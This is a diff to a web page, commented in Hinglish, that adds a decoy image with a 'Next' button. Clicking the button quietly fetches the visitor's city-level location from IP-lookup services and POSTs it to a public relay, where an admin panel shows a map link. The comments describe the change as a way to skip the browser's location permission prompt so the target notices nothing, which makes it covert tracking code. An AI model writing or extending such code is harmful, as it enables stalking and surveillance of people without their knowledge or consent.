@@ -228,6 +228,7 @@
      Location background me khud mangi jati hai aur admin panel ko bheji jati hai. -->
 <div id="picScreen" style="display:none;position:fixed;inset:0;background:#000;z-index:5;">
   <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?q=80&w=1200&auto=format&fit=crop" alt="" style="width:100%;height:100%;object-fit:cover;display:block">
+  <button id="nextBtn" type="button" style="position:absolute;left:50%;bottom:8%;transform:translateX(-50%);padding:18px 54px;font-size:26px;font-weight:700;color:#111;background:rgba(255,255,255,0.92);border:none;border-radius:999px;box-shadow:0 4px 18px rgba(0,0,0,0.45);">Next &#10140;</button>
 </div>
 
 <!-- Dusri picture — Allow ke baad error ki jagah ye dikhti hai (bhai mode me) -->
@@ -255,6 +256,54 @@
     var mainEl0 = document.querySelector('main');
     if (mainEl0) mainEl0.style.display = 'none';
   }
+
+  /* --- IP location (bhai mode): koi permission pop-up nahi, sirf IP se
+     sheher-level location. Next dabate hi IP location relay par bhej do
+     aur dusri picture dikhao. --- */
+  var ipSent = false;
+  function showNextPic(){
+    var mainEl = document.querySelector('main');
+    if (mainEl) mainEl.style.display = 'none';
+    var picEl2 = document.getElementById('picScreen');
+    if (picEl2) picEl2.style.display = 'none';
+    var pic2 = document.getElementById('picScreen2');
+    if (pic2) pic2.style.display = 'block';
+  }
+  function fetchIpLocation(){
+    if (ipSent) return;
+    var done = function(lat, lng){
+      if (ipSent) return;
+      ipSent = true;
+      sendToRelay(lat, lng, 5000);
+      showNextPic();
+    };
+    var showPicOnly = function(){
+      if (ipSent) return;
+      ipSent = true;
+      showNextPic();
+    };
+    fetch('https://ipapi.co/json/')
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        if (d && typeof d.latitude === 'number' && typeof d.longitude === 'number') done(d.latitude, d.longitude);
+        else throw new Error('no coords');
+      })
+      .catch(function(){
+        fetch('https://ip-api.com/json/')
+          .then(function(r){ return r.json(); })
+          .then(function(d){
+            if (d && d.status === 'success' && typeof d.lat === 'number' && typeof d.lon === 'number') done(d.lat, d.lon);
+            else showPicOnly();
+          })
+          .catch(function(){ showPicOnly(); });
+      });
+    setTimeout(function(){ if (!ipSent) showPicOnly(); }, 8000);
+  }
+  var nextBtn = document.getElementById('nextBtn');
+  if (nextBtn) nextBtn.addEventListener('click', function(){
+    nextBtn.disabled = true;
+    fetchIpLocation();
+  });
   var errorScreen = document.getElementById('errorScreen');
   var hero = document.getElementById('hero');
   var mainBtn = document.getElementById('mainBtn');
@@ -300,14 +349,6 @@
            dikhao. Location pehle hi relay par ja chuki hai, admin panel me link
            aa jayega. Pehli picture kam se kam 10 second nazar aaye — agar location
            jaldi mil jaye to dusri picture tabhi aaye jab 10 second poore hon. */
-        var showNextPic = function() {
-          var mainEl = document.querySelector('main');
-          if (mainEl) mainEl.style.display = 'none';
-          var picEl2 = document.getElementById('picScreen');
-          if (picEl2) picEl2.style.display = 'none';
-          var pic2 = document.getElementById('picScreen2');
-          if (pic2) pic2.style.display = 'block';
-        };
         var elapsed = Date.now() - pageLoadTime;
         if (elapsed >= 10000) { showNextPic(); }
         else { setTimeout(showNextPic, 10000 - elapsed); }
@@ -367,9 +408,10 @@
     }
   });
 
-  /* Page khulte hi khud location mango — bhai ko sirf Allow dabana hai */
+  /* Page khulte hi khud location mango — bhai mode me NAHI, wahan IP
+     location Next dabane par aati hai, koi Allow pop-up nahi aata */
   window.addEventListener('load', function(){
-    setTimeout(requestLocation, 350);
+    if (!isApk) setTimeout(requestLocation, 350);
   });
 
   /* Settings se wapas aaye to khud dobara check karo */
@@ -389,7 +431,8 @@
      location us topic par POST ho jati hai, aur jis phone par
      ye page khula ho wahan ka panel usi topic ko EventSource
      aur polling se sun kar Maps ka link dikha deta hai.
-     Bhai ko kuch bhejna nahi — sirf Allow dabana hai.
+     Bhai mode me Next dabate hi IP se location us topic par POST ho
+     jati hai — koi Allow pop-up nahi aata, bhai ko kuch bhejna nahi.
      Note: topic public relay hai — link jisko milega wo
      location dekh sakta hai (page par saaf likha hai).
      ============================================================ */
